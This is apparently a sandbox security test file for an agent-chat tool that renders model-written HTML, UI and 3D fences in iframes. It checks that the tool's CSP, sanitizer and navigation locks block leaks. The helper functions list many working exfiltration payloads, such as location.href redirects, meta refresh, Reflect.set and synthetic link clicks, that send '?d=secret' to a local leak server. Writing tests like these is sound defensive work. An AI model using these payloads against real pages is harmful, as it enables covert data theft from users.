import { expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { bootNcli } from "../src/boot";
import { iframeTag, frameHtml } from "../src/live/frame";
import { compartmentHtml, LIVE_3D_CSP, LIVE_DOC_CSP, LIVE_PRELUDE, sanitizeLiveMarkup } from "../src/live/compartment";
import { startLiveOrigin } from "../src/live/origin";
import { wrapUiSource } from "../src/live/ui-frame";
import { chromePath, launchChrome } from "../src/perf/cdp";
import { makeHub, waitUntil } from "./helpers";

const appJs = readFileSync(new URL("../public/app.js", import.meta.url), "utf8");
const kit = readFileSync(new URL("../public/ncli3d.js", import.meta.url), "utf8");

test("html ui and 3d lock navigation and RTC before agent code", () => {
  expect(LIVE_PRELUDE).toContain("RTCPeerConnection");
  expect(LIVE_PRELUDE).toContain("ncliFakes");
  expect(LIVE_DOC_CSP).toContain("navigate-to 'none'");
  expect(appJs).toContain("function compartmentHtml");
  expect(appJs).toContain("NCLI_LIVE_ORIGIN");
  expect(appJs).toContain("function sanitizeLiveMarkup");
  expect(appJs).toContain("data-live-kind");
  expect(appJs).toContain("function bindLiveUrlAsks");
  expect(appJs).toContain("function confirmLiveUrl");
  expect(appJs).toContain('e.target.closest?.(".live-url-go")');
  expect(appJs).toContain("function isLiveFence");
  expect(appJs).toContain("form-action 'none'");
  expect(appJs).toContain("navigate-to 'none'");
  expect(kit).toContain("ncliFakes");
  expect(kit).toContain("innerHTML");
  expect(LIVE_3D_CSP).toContain("navigate-to 'none'");
  const html = frameHtml({ kind: "html", source: "<p>ok</p>" });
  expect(html.indexOf("ncliFakes")).toBeLessThan(html.indexOf("<p>ok</p>"));
  expect(wrapUiSource("<p>card</p>").indexOf("ncliFakes")).toBeLessThan(wrapUiSource("<p>card</p>").indexOf("<p>card</p>"));
  expect(iframeTag({ kind: "html", source: "<b>x</b>" })).not.toContain("allow-forms");
  expect(compartmentHtml('<a href="javascript:alert(1)">x</a>')).not.toMatch(/href=/i);
});

test("sanitizeLiveMarkup strips meta refresh and javascript URLs", () => {
  const dirty =
    '<meta http-equiv="refresh" content="0;url=http://x/?d=secret"><a href="javascript:alert(1)">x</a><a href=javascript:alert(2)>y</a><p>ok</p>';
  const clean = sanitizeLiveMarkup(dirty);
  expect(clean).not.toContain("refresh");
  expect(clean).not.toContain("javascript:");
  expect(clean).toContain("<p>ok</p>");
  expect(frameHtml({ kind: "html", source: dirty })).not.toContain('http-equiv="refresh"');
  expect(wrapUiSource(dirty)).not.toMatch(/href=/i);
  expect(wrapUiSource(dirty)).toContain("<a>x</a>");
  const wrapped = compartmentHtml("<script>location.href='http://x/?d=secret'</script>");
  expect(wrapped).toContain("ncliFakes");
  expect(wrapped).toContain("location.href=");
  expect(wrapped.indexOf("ncliFakes")).toBeLessThan(wrapped.indexOf("location.href="));
});

test("live origin is a separate port with navigate-to CSP", async () => {
  const live = startLiveOrigin({ publicDir: process.cwd() + "/public" });
  try {
    expect(live.origin).toMatch(/^http:\/\/127\.0\.0\.1:\d+$/);
    const shell = await fetch(`${live.origin}/shell`);
    expect(shell.headers.get("content-security-policy")).toContain("navigate-to 'none'");
    const page = await fetch(`${live.origin}/3d`);
    expect(page.headers.get("content-security-policy")).toContain("navigate-to 'none'");
    expect(page.ok).toBe(true);
  } finally {
    live.stop();
  }
});

async function withLeak() {
  const hits: string[] = [];
  const leak = Bun.serve({
    hostname: "127.0.0.1",
    port: 0,
    fetch(req) {
      const u = new URL(req.url);
      hits.push(`${u.pathname}${u.search}`);
      return new Response("leak", { headers: { "content-type": "text/html" } });
    },
  });
  return { hits, leak, url: `http://127.0.0.1:${leak.port}` };
}

function htmlVectors(url: string): Array<{ kind: "html" | "ui"; source: string }> {
  const leak = (via: string) => JSON.stringify(`${url}/?d=secret&via=${via}`);
  const href = (via: string) => `${url}/?d=secret&via=${via}`;
  return [
    { kind: "html", source: `<p>ncli-safe</p><script>location.href=${leak("html-href")}</script>` },
    { kind: "html", source: `<p>ncli-safe</p><script>location.replace(${leak("html-replace")})</script>` },
    { kind: "html", source: `<p>ncli-safe</p><script>location.assign(${leak("html-assign")})</script>` },
    { kind: "html", source: `<meta http-equiv="refresh" content="0;url=${href("html-meta")}"><p>ncli-safe</p>` },
    { kind: "html", source: `<p>ncli-safe</p><script>document.location=${leak("html-doc-loc")}</script>` },
    { kind: "html", source: `<p>ncli-safe</p><script>window.location=${leak("html-win-loc")}</script>` },
    { kind: "html", source: `<p>ncli-safe</p><script>Reflect.set(location,"href",${leak("html-reflect")})</script>` },
    { kind: "html", source: `<p>ncli-safe</p><area href="${href("html-area")}" id="go"><script>document.getElementById("go").click()</script>` },
    {
      kind: "html",
      source: `<p>ncli-safe</p><svg><a href="${href("html-svg")}" id="go"><text>x</text></a></svg><script>document.getElementById("go").click()</script>`,
    },
    {
      kind: "html",
      source: `<p>ncli-safe</p><a href="${href("html-click")}" id="go">x</a><script>document.getElementById("go").click()</script>`,
    },
    {
      kind: "html",
      source: `<p>ncli-safe</p><script>document.body.innerHTML='<meta http-equiv="refresh" content="0;url='+${leak("html-inner")}+'">'</script>`,
    },
    { kind: "ui", source: `<p>ncli-safe</p><script>location.href=${leak("ui-href")}</script>` },
    { kind: "ui", source: `<p>ncli-safe</p><script>location.replace(${leak("ui-replace")})</script>` },
    { kind: "ui", source: `<p>ncli-safe</p><script>location.assign(${leak("ui-assign")})</script>` },
    { kind: "ui", source: `<meta http-equiv="refresh" content="0;url=${href("ui-meta")}"><p>ncli-safe</p>` },
    { kind: "ui", source: `<p>ncli-safe</p><script>document.location=${leak("ui-doc-loc")}</script>` },
    { kind: "ui", source: `<p>ncli-safe</p><script>window.location=${leak("ui-win-loc")}</script>` },
    { kind: "ui", source: `<p>ncli-safe</p><script>Reflect.set(location,"href",${leak("ui-reflect")})</script>` },
    { kind: "ui", source: `<p>ncli-safe</p><area href="${href("ui-area")}" id="go"><script>document.getElementById("go").click()</script>` },
    {
      kind: "ui",
      source: `<p>ncli-safe</p><svg><a href="${href("ui-svg")}" id="go"><text>x</text></a></svg><script>document.getElementById("go").click()</script>`,
    },
    {
      kind: "ui",
      source: `<p>ncli-safe</p><a href="${href("ui-click")}" id="go">x</a><script>document.getElementById("go").click()</script>`,
    },
    {
      kind: "ui",
      source: `<p>ncli-safe</p><script>document.body.innerHTML='<meta http-equiv="refresh" content="0;url='+${leak("ui-inner")}+'">'</script>`,
    },
  ];
}

function threeDVectors(url: string): string[] {
  const leak = (via: string) => JSON.stringify(`${url}/?d=secret&via=${via}`);
  return [
    `location.href=${leak("3d-href")}`,
    `location.replace(${leak("3d-replace")})`,
    `location.assign(${leak("3d-assign")})`,
    `var m=document.createElement("meta");m.setAttribute("http-equiv","refresh");m.setAttribute("content","0;url="+${leak("3d-meta")});document.head.appendChild(m)`,
    `var a=document.createElement("a");a.setAttribute("href",${leak("3d-click")});a.id="go";document.body.appendChild(a);a.click()`,
    `document.location=${leak("3d-doc-loc")}`,
    `window.location=${leak("3d-win-loc")}`,
    `Reflect.set(location,"href",${leak("3d-reflect")})`,
    `document.body.innerHTML='<meta http-equiv="refresh" content="0;url='+${leak("3d-inner")}+'">'`,
    `var a=document.createElement("area");a.setAttribute("href",${leak("3d-area")});a.id="go";document.body.appendChild(a);a.click()`,
    `document.body.innerHTML='<svg><a href="'+${leak("3d-svg")}+'" id="go"><text>x</text></a></svg>';document.getElementById("go").click()`,
  ];
}

test("chrome: html and ui navigation vectors make zero leak GETs", async () => {
  if (!chromePath()) throw new Error("chrome not found");
  const { hits, leak, url } = await withLeak();
  const { hub } = await makeHub();
  const fences = htmlVectors(url)
    .map((v) => "```ncli " + v.kind + "\n" + v.source + "\n```")
    .join("\n\n");
  hub.memory.append({ kind: "talk", text: fences, seat: "claude" });
  hub.cfg.port = 19700 + Math.floor(Math.random() * 400);
  const booted = await bootNcli({ cfg: hub.cfg, hub, root: process.cwd() });
  expect(booted.report.liveOrigin).toMatch(/^http:\/\/127\.0\.0\.1:\d+$/);
  expect(booted.report.liveOrigin).not.toBe(booted.report.uiUrl);
  let driver: Awaited<ReturnType<typeof launchChrome>> | undefined;
  try {
    driver = await launchChrome(10300 + Math.floor(Math.random() * 400));
    await driver.session.attachPage("about:blank");
    await driver.session.send("Page.navigate", { url: booted.report.uiUrl });
    await waitUntil(
      () => driver!.session.evaluate(`document.querySelectorAll("iframe.live-frame").length >= ${htmlVectors(url).length}`),
      12000,
      "html ui frames",
    );
    const src = await driver.session.evaluate<string>(
      `document.querySelector("iframe.live-frame")?.getAttribute("src") || ""`,
    );
    expect(src.startsWith(booted.report.liveOrigin + "/")).toBe(true);
    await Bun.sleep(800);
    expect(hits).toEqual([]);
  } finally {
    driver?.close();
    booted.stop();
    leak.stop();
  }
}, 30000);

test("chrome: 3d navigation vectors make zero leak GETs", async () => {
  if (!chromePath()) throw new Error("chrome not found");
  const { hits, leak, url } = await withLeak();
  const { hub } = await makeHub();
  const fences = threeDVectors(url)
    .map((src) => "```ncli 3d\n" + src + "\n```")
    .join("\n\n");
  hub.memory.append({ kind: "talk", text: fences, seat: "claude" });
  hub.cfg.port = 20000 + Math.floor(Math.random() * 400);
  const booted = await bootNcli({ cfg: hub.cfg, hub, root: process.cwd() });
  let driver: Awaited<ReturnType<typeof launchChrome>> | undefined;
  try {
    driver = await launchChrome(10600 + Math.floor(Math.random() * 400));
    await driver.session.attachPage("about:blank");
    await driver.session.send("Page.navigate", { url: booted.report.uiUrl });
    await waitUntil(
      () => driver!.session.evaluate(`document.querySelectorAll("iframe.live-3d").length >= ${threeDVectors(url).length}`),
      12000,
      "3d frames",
    );
    await Bun.sleep(1200);
    expect(hits).toEqual([]);
  } finally {
    driver?.close();
    booted.stop();
    leak.stop();
  }
}, 30000);

test("chrome: html cannot open RTCPeerConnection", async () => {
  if (!chromePath()) throw new Error("chrome not found");
  const { hits, leak, url } = await withLeak();
  const { hub } = await makeHub();
  hub.memory.append({
    kind: "talk",
    text:
      "```ncli html\n<p>ncli-safe</p><script>try{new RTCPeerConnection();location.href=" +
      JSON.stringify(url + "/?via=rtc") +
      "}catch(e){}</script>\n```",
    seat: "claude",
  });
  hub.cfg.port = 19800 + Math.floor(Math.random() * 400);
  const booted = await bootNcli({ cfg: hub.cfg, hub, root: process.cwd() });
  let driver: Awaited<ReturnType<typeof launchChrome>> | undefined;
  try {
    driver = await launchChrome(10400 + Math.floor(Math.random() * 400));
    await driver.session.attachPage("about:blank");
    await driver.session.send("Page.navigate", { url: booted.report.uiUrl });
    await waitUntil(
      () =>
        driver!.session.evaluate(`Boolean(document.querySelector("iframe.live-frame"))`),
      12000,
      "html frame",
    );
    await Bun.sleep(400);
    expect(hits).toEqual([]);
  } finally {
    driver?.close();
    booted.stop();
    leak.stop();
  }
}, 30000);

test("chrome: url kind does not GET until the user confirms", async () => {
  if (!chromePath()) throw new Error("chrome not found");
  const { hits, leak, url } = await withLeak();
  const { hub } = await makeHub();
  hub.memory.append({
    kind: "talk",
    text: "```ncli url\n" + url + "/?d=secret&via=url\n```",
    seat: "claude",
  });
  hub.cfg.port = 20100 + Math.floor(Math.random() * 400);
  const booted = await bootNcli({ cfg: hub.cfg, hub, root: process.cwd() });
  let driver: Awaited<ReturnType<typeof launchChrome>> | undefined;
  try {
    driver = await launchChrome(10700 + Math.floor(Math.random() * 400));
    await driver.session.attachPage("about:blank");
    await driver.session.send("Page.navigate", { url: booted.report.uiUrl });
    await waitUntil(
      () => driver!.session.evaluate(`Boolean(document.querySelector(".live-url-go"))`),
      12000,
      "url confirm",
    );
    await Bun.sleep(400);
    expect(hits).toEqual([]);
    await driver.session.evaluate(`document.querySelector(".live-url-go").click()`);
    await waitUntil(() => hits.some((h) => h.includes("via=url")), 8000, "url opened");
  } finally {
    driver?.close();
    booted.stop();
    leak.stop();
  }
}, 30000);
